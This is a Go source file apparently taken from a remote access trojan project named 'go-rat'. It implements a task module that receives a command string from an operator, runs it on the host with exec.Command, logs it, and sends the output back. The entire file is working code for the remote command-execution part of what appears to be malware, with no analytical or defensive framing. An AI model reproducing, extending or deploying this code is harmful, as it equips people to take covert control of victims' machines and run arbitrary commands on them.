package command

import (
	"fmt"
	"go-rat/utils/output"
	"go-rat/utils/types"
	"os/exec"
	"strings"
)

type Module struct{}

func (m Module) Execute(task types.Task, params []types.Parameter) ([]types.Output, error) {
	command, err := types.GetParameter("command", params)
	if err != nil {
		return []types.Output{}, err
	}

	commandStr, ok := command.Value.(string)
	if !ok {
		return []types.Output{}, fmt.Errorf("could not convert value to string")
	}

	commandParts := strings.Split(commandStr, " ")

	fmt.Printf("Executing: '%s':\n", command.Value)
	output.LogInfo(task.ID, fmt.Sprintf("Executing: '%s'", command.Value))
	out, err := exec.Command(commandParts[0], commandParts[1:]...).Output()
	if err != nil {
		return []types.Output{}, err
	}

	fmt.Println(strings.Trim(string(out), "\n"))
	output, err := output.OutputText(strings.Trim(string(out), "\n"))
	if err != nil {
		return []types.Output{}, err
	}
	return append([]types.Output{}, output), nil
}
